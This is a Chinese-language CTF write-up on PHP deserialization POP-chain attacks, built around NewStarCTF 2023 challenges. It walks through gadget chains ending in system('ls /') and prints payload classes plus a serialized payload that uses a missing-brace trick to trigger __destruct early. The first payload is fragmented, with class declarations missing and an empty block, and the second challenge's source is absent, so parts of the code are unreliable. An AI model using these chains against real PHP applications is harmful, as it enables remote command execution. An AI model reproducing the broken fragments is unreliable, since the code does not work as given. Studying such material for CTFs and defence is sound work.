    Pop 链攻击

    pop 链攻击

    原理是因为调用了不安全的魔术方法。

    一般的反序列化题目都是在想办法调用魔术方法，因为大部分题目中魔术方法会有漏洞可供利用，但是不同的是 pop 链攻击是针对敏感代码并不在魔术方法中的情况。

    例题：newstarctf 2023 POP GADGET

    <?php
highlight_file(__FILE__);

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}

class Then{
    private $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

class Super{
    protected $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

    public function end()
    {
        die("==GAME OVER==");
    }
}

class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func;
    public $var;

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

@unserialize($_POST['pop']);

    再补充一些内容。___destruct 函数是 php 中的一个魔术方法，会在对象销毁的时候被自动调用，而一般来说会有两种情况触发。

    • 实例化对象

    • 执行反序列化

    实例化对象，例如 $a = new func();

    执行反序列化，例如 unserialize($a);

    __construct 方法会在被调用时触发。

    另一个是 __toString 方法，是一个非常重要的方法，在我们把一个对象当作字符串处理的时候会触发，所以触发时机非常多，也是我们需要注意的重要突破口。

    比如我们 echo 一个东西的时候显然会触发。

    __call 方法，会在我们调用一个并不存在的成员函数时触发。一个小细节，该函数有两个参数，第一个是我们调用的不存在的成员函数，第二个是尝试调用时传入的参数。

    __invoke 函数会在尝试把一个对象当作函数调用的时候触发，eg：

    $a = new func();
$a();

    最后一个 __unset 会在使用unset调用私有变量进行触发，eg

    class test{

    private $a;
    
}



$c =new test();

unset($c->a);

    显然在上述代码中，a 是 private 变量，在外部调用是不合法的。

    unset() 函数表示销毁一个变量。

    接下来讲讲如何构造 pop 链。

    构造 pop 链应当利用反推方法，也就是先找到我们应该利用的函数，然后再根据需要一步步调用其他函数。

    显然在例题中，我们能够利用的类如下

    class WhiteGod{
    public $func;//可以将其赋值为 system 来执行系统调用函数。
    public $var;//你想执行的参数。

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

    大概讲一下，这里$this->func 会被当作一个函数来处理，你可以给这个变量赋值，这样就能执行你想执行的任何 php 自带或者自己的函数。

    后面的$this->var 就是传入这个函数的参数。

    所以我们现在找到了利用目标，就可以开始寻求构造方法了，这里显然需要用到 __unset 方法。我们通览所有代码，发现了突破口。

    class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

    这里执行了 unset 函数。但是你会发现并没有一个叫做 log 的东西，所以这东西并不合法，结合上面讲到的内容可以知道需要让 __unset 触发只需要调用不合法的变量 unset 即可，所以非常好的，我们可以让 $handle=new Whitegod(); 这样 log 并不合法， __unset就会被触发了。

    接下来你会发现 CTF类中并没有魔术方法，所以我们必须想办法调用这个函数，不难发现

    class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

    这个类会调用 end() 函数，所以我们只需要把 obj 和 CTF 类联系起来。

    接下来 handle 这个类有 __call()函数，根据上述所讲，我们需要调用一个并不存在的成员函数，所以也不难发现

    class Super{
    protected $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

    public function end()
    {
        die("==GAME OVER==");
    }
}

    这东西里有一个 getStr() 并且这东西除了在这里调用之外并没有在其他任何地方调用过，所以就是他了，我们让这里的 obj 和 handle 联系起来即可。

    接下来需要__invoke 函数，也不难发现 

    class Then{
    private $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

    这里尝试执行 func 所以把这里的 func 和 super 类联系起来，这里的魔术方法是 toString 发现

    class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}

    会调用正则表达式 preg_match 所以会当作字符串处理，所以把 name 和 Then 类联系起来，pop 链构造完成，我们只需反序列化 Begin 就能完成对 __destruct 的调用。

    所以我们构造完成的 pop 链大概是这样：

    Begin->Then->Super->Handle->CTF->Whitegod

    然后我们就可以开始写 payload ，这里的要点是要在每个类中写上 __construct 魔术方法，这样就可以在调用类的时候自动触发。然后记得在类内调用变量的时候要加上 $this->

    payload(供参考)

    protected $obj;
    public function __construct(){
        $this->obj=new CTF();
    }


    public function __call($func, $vars)
    {
        $this->obj->end();
    }

    protected $obj;
    public function __construct(){
        $this->obj=new Handle();
    }

    public function __invoke()
    {
        $this->obj->getStr();
    }

    {

    }

class CTF{
    public $handle;
    public function __construct(){
        $this->handle=new WhiteGod();
    }


    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func="system";
    public $var="ls /";//ls完就是找 flag.

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

    这里就不再详细讲解怎么构造 pop 链了。

    这里有一个新魔术方法是 __get 在调用成员属性时触发。

    pop 链 start->crypto->reverse->pwn->web

    misc 没什么用，这里有一个小难点是 php 中的 die 会先输出内容再退出程序，所以这里会调用 tostring 方法。

    但是这里的主要问题是抛出了一个异常，导致没法触发 __destruct 函数。

    所以这里我们需要做的就是提前触发 __destruct 函数。

    先给出 payload 

    <?php
//highlight_file(__FILE__);
//start->crypto->reverse->pwn->web
class Start{
    public $errMsg;
    public function __construct(){
        $this->errMsg=new Crypto();
    }
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __construct(){
        $this->obj=new Web();
    }
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}

class Reverse{
    public $func;
    public function __construct(){
        $this->func=new Pwn();
    }
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func="system";
    public $var="ls /";
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}

class Crypto{
    public $obj;
    public function __construct(){
        $this->obj=new Reverse();
    }
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}

class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}

    这里反序列化完不能直接用，因为有抛出的异常，php 有一个神秘性质，只要你删掉一个后花括号就可以提前触发__destruct 函数。

    也就是把原来的

    O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}

    改为

    O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}

    注意少了一个后花括号。

    然后把上面的东西 urlencode 就好了，原理我也不是很懂。
